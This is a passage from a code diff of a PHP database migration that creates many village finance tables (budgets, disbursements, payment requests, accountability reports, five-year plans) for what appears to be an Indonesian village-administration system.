+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_pencairan
+        if (! $this->db->table_exists('keuangan_ta_pencairan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_pencairan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_Cek` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Tgl_Cek` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`Potongan` varchar(100) NOT NULL,
+				`KdBayar` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_perangkat
+        if (! $this->db->table_exists('keuangan_ta_perangkat')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_perangkat` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Jabatan` varchar(100) NOT NULL,
+				`No_ID` varchar(100) NOT NULL,
+				`Nama_Perangkat` varchar(100) NOT NULL,
+				`Alamat_Perangkat` varchar(100) NOT NULL,
+				`Nomor_HP` varchar(100) NOT NULL,
+				`Rek_Bank` varchar(100) NOT NULL,
+				`Nama_Bank` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rab
+        if (! $this->db->table_exists('keuangan_ta_rab')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rab` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`AnggaranStlhPAK` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rab_rinci
+        if (! $this->db->table_exists('keuangan_ta_rab_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rab_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_SubRinci` varchar(100) NOT NULL,
+				`No_Urut` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`Uraian` varchar(100) NOT NULL,
+				`Satuan` varchar(100) NOT NULL,
+				`JmlSatuan` varchar(100) NOT NULL,
+				`HrgSatuan` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`JmlSatuanPAK` varchar(100) NOT NULL,
+				`HrgSatuanPAK` varchar(100) NOT NULL,
+				`AnggaranStlhPAK` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`Kode_SBU` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rab_sub
+        if (! $this->db->table_exists('keuangan_ta_rab_sub')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rab_sub` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_SubRinci` varchar(100) NOT NULL,
+				`Nama_SubRinci` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`AnggaranStlhPAK` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_bidang
+        if (! $this->db->table_exists('keuangan_ta_rpjm_bidang')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_bidang` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Bid` varchar(100) NOT NULL,
+				`Nama_Bidang` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_kegiatan
+        if (! $this->db->table_exists('keuangan_ta_rpjm_kegiatan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_kegiatan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Bid` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`ID_Keg` varchar(100) NOT NULL,
+				`Nama_Kegiatan` varchar(100) NOT NULL,
+				`Lokasi` varchar(100) NOT NULL,
+				`Keluaran` varchar(100) NOT NULL,
+				`Kd_Sas` varchar(100) NOT NULL,
+				`Sasaran` varchar(100) NOT NULL,
+				`Tahun1` varchar(100) NOT NULL,
+				`Tahun2` varchar(100) NOT NULL,
+				`Tahun3` varchar(100) NOT NULL,
+				`Tahun4` varchar(100) NOT NULL,
+				`Tahun5` varchar(100) NOT NULL,
+				`Tahun6` varchar(100) NOT NULL,
+				`Swakelola` varchar(100) NOT NULL,
+				`Kerjasama` varchar(100) NOT NULL,
+				`Pihak_Ketiga` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_misi
+        if (! $this->db->table_exists('keuangan_ta_rpjm_misi')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_misi` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`ID_Misi` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`ID_Visi` varchar(100) NOT NULL,
+				`No_Misi` varchar(100) NOT NULL,
+				`Uraian_Misi` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_pagu_indikatif
+        if (! $this->db->table_exists('keuangan_ta_rpjm_pagu_indikatif')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_pagu_indikatif` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Sumber` varchar(100) NOT NULL,
+				`Tahun1` varchar(100) NOT NULL,
+				`Tahun2` varchar(100) NOT NULL,
+				`Tahun3` varchar(100) NOT NULL,
+				`Tahun4` varchar(100) NOT NULL,
+				`Tahun5` varchar(100) NOT NULL,
+				`Tahun6` varchar(100) NOT NULL,
+				`Pola` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_pagu_tahunan
+        if (! $this->db->table_exists('keuangan_ta_rpjm_pagu_tahunan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_pagu_tahunan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Tahun` varchar(100) NOT NULL,
+				`Kd_Sumber` varchar(100) NOT NULL,
+				`Biaya` varchar(100) NOT NULL,
+				`Volume` varchar(100) NOT NULL,
+				`Satuan` varchar(100) NOT NULL,
+				`Lokasi_Spesifik` varchar(100) NOT NULL,
+				`Jml_Sas_Pria` varchar(100) NOT NULL,
+				`Jml_Sas_Wanita` varchar(100) NOT NULL,
+				`Jml_Sas_ARTM` varchar(100) NOT NULL,
+				`Waktu` varchar(100) NOT NULL,
+				`Mulai` varchar(100) NOT NULL,
+				`Selesai` varchar(100) NOT NULL,
+				`Pola_Kegiatan` varchar(100) NOT NULL,
+				`Pelaksana` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_sasaran
+        if (! $this->db->table_exists('keuangan_ta_rpjm_sasaran')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_sasaran` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`ID_Sasaran` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`ID_Tujuan` varchar(100) NOT NULL,
+				`No_Sasaran` varchar(100) NOT NULL,
+				`Uraian_Sasaran` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_tujuan
+        if (! $this->db->table_exists('keuangan_ta_rpjm_tujuan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_tujuan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`ID_Tujuan` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`ID_Misi` varchar(100) NOT NULL,
+				`No_Tujuan` varchar(100) NOT NULL,
+				`Uraian_Tujuan` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_rpjm_visi
+        if (! $this->db->table_exists('keuangan_ta_rpjm_visi')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_rpjm_visi` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`ID_Visi` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_Visi` varchar(100) NOT NULL,
+				`Uraian_Visi` varchar(100) NOT NULL,
+				`TahunA` varchar(100) NOT NULL,
+				`TahunN` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_saldo_awal
+        if (! $this->db->table_exists('keuangan_ta_saldo_awal')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_saldo_awal` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Jenis` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`Debet` varchar(100) NOT NULL,
+				`Kredit` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spj
+        if (! $this->db->table_exists('keuangan_ta_spj')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spj` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_SPJ` varchar(100) NOT NULL,
+				`Tgl_SPJ` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`Potongan` varchar(100) NOT NULL,
+				`Status` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spjpot
+        if (! $this->db->table_exists('keuangan_ta_spjpot')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spjpot` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPJ` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spj_bukti
+        if (! $this->db->table_exists('keuangan_ta_spj_bukti')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spj_bukti` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_SPJ` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Nm_Penerima` varchar(100) NOT NULL,
+				`Alamat` varchar(100) NOT NULL,
+				`Rek_Bank` varchar(100) NOT NULL,
+				`Nm_Bank` varchar(100) NOT NULL,
+				`NPWP` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spj_rinci
+        if (! $this->db->table_exists('keuangan_ta_spj_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spj_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_SPJ` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`JmlCair` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				`Alamat` varchar(100) NOT NULL,
+				`Sisa` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spj_sisa
+        if (! $this->db->table_exists('keuangan_ta_spj_sisa')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spj_sisa` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`No_SPJ` varchar(100) NOT NULL,
+				`Tgl_SPJ` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Tgl_SPP` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spp
+        if (! $this->db->table_exists('keuangan_ta_spp')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spp` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Tgl_SPP` varchar(100) NOT NULL,
+				`Jn_SPP` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`Potongan` varchar(100) NOT NULL,
+				`Status` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spp_rinci
+        if (! $this->db->table_exists('keuangan_ta_spp_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spp_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_sppbukti
+        if (! $this->db->table_exists('keuangan_ta_sppbukti')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_sppbukti` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`Nm_Penerima` varchar(100) NOT NULL,
+				`Alamat` varchar(100) NOT NULL,
+				`Rek_Bank` varchar(100) NOT NULL,
+				`Nm_Bank` varchar(100) NOT NULL,
+				`NPWP` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_spppot
+        if (! $this->db->table_exists('keuangan_ta_spppot')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_spppot` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SPP` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_sts
+        if (! $this->db->table_exists('keuangan_ta_sts')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_sts` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Uraian` varchar(100) NOT NULL,
+				`NoRek_Bank` varchar(100) NOT NULL,
+				`Nama_Bank` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`Nm_Bendahara` varchar(100) NOT NULL,
+				`Jbt_Bendahara` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_sts_rinci
+        if (! $this->db->table_exists('keuangan_ta_sts_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_sts_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`No_TBP` varchar(100) NOT NULL,
+				`Uraian` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_tbp
+        if (! $this->db->table_exists('keuangan_ta_tbp')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_tbp` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Uraian` varchar(100) NOT NULL,
+				`Nm_Penyetor` varchar(100) NOT NULL,
+				`Alamat_Penyetor` varchar(100) NOT NULL,
+				`TTD_Penyetor` varchar(100) NOT NULL,
+				`NoRek_Bank` varchar(100) NOT NULL,
+				`Nama_Bank` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`Nm_Bendahara` varchar(100) NOT NULL,
+				`Jbt_Bendahara` varchar(100) NOT NULL,
+				`Status` varchar(100) NOT NULL,
+				`KdBayar` varchar(100) NOT NULL,
+				`Ref_Bayar` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_tbp_rinci
+        if (! $this->db->table_exists('keuangan_ta_tbp_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_tbp_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`RincianSD` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_triwulan
+        if (! $this->db->table_exists('keuangan_ta_triwulan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_triwulan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`KURincianSD` varchar(100) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Sifat` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`Tw1Rinci` varchar(100) NOT NULL,
+				`Tw2Rinci` varchar(100) NOT NULL,
+				`Tw3Rinci` varchar(100) NOT NULL,
+				`Tw4Rinci` varchar(100) NOT NULL,
+				`KunciData` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_triwulan_rinci
+        if (! $this->db->table_exists('keuangan_ta_triwulan_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_triwulan_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`KdPosting` varchar(100) NOT NULL,
+				`KURincianSD` varchar(100) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Sifat` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`Tw1Rinci` varchar(100) NOT NULL,
+				`Tw2Rinci` varchar(100) NOT NULL,
+				`Tw3Rinci` varchar(100) NOT NULL,
+				`Tw4Rinci` varchar(100) NOT NULL,
+				`KunciData` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+    }
+}
